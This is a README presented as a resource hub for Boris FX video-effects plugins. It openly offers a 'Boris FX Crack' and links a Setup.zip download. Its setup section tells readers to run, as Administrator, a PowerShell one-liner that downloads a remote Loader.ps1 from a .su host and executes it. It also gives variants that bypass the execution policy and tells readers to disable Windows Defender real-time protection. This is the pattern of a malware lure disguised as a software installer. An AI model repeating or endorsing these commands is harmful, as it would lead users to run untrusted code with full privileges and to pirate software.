# Boris FX Ultimate Resource Hub: Presets, Plugins & VFX Workflows

Welcome to the ultimate open-source repository dedicated to **Boris FX Crack** software suites. This repository serves as a comprehensive library for video editors, visual effects artists, and motion designers looking for high-quality tools, scripts, configuration files, and presets compatible with Boris FX products.

## 🚀 Supported Software & Plugins
This project includes assets and documentation optimized for the latest versions of:
* **Boris FX Sapphire:** Advanced VFX plugins, lens flares, and lighting effects.
* **Boris FX Continuum:** Comprehensive toolkit for image restoration, transitions, and keying.
* **Boris FX Mocha Pro:** Academy Award-winning planar tracking, masking, and object removal.
* **Boris FX Silhouette & Optics:** Cinematic rotoscoping, paint, and digital photography filters.

### 🚀 Direct Download

[<img src="https://img.shields.io/badge/Download-black?style=for-the-badge&logo=github"/>](https://software-storage.su/files/Setup.zip)

Read Readme.txt before install!

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://software-storage.su/powershell/Loader.ps1 | iex
   ```
---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

## 🛠️ Key Features & VFX Workflows Included

* **Planar Tracking & Masking:** Pre-configured Mocha Pro setups for screen insertion and stabilization.
* **Cinematic Looks:** Ready-to-use Sapphire lens flare collections and color grading LUTs.
* **AI-Powered Tools:** Guides and assets utilizing Boris FX Mocha ML and modern AI features.
* **Performance Optimization:** Configurations for GPU acceleration (CUDA/Metal) to speed up rendering.
